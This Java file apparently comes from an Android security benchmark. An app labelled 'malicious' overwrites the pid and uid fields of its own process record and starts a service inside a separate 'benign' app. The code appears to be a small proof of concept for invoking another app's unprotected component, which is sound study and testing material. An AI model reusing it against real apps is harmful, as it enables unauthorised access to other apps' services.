package edu.ksu.cs.malicious;

import android.app.ActivityManager;
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.util.List;

public class MalActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume(){
        super.onResume();

        ActivityManager am = (ActivityManager) getSystemService(getApplicationContext().ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> runningAppProcessInfos = am.getRunningAppProcesses();
        for(ActivityManager.RunningAppProcessInfo rap : runningAppProcessInfos){
            if(rap.processName.equals("edu.ksu.cs.malicious")){
                rap.pid = 27731;
                rap.uid = 10061;
                Toast.makeText(this, "pid = " + rap.pid + " uid = " + rap.uid, Toast.LENGTH_SHORT).show();
                Log.d("Malicious","pid = " + rap.pid + " uid = " + rap.uid);
            }
        }

        Intent i = new Intent();
        i.setPackage("edu.ksu.cs.benign");
        i.setClassName("edu.ksu.cs.benign","edu.ksu.cs.benign.MyService");
        startService(i);

    }
}
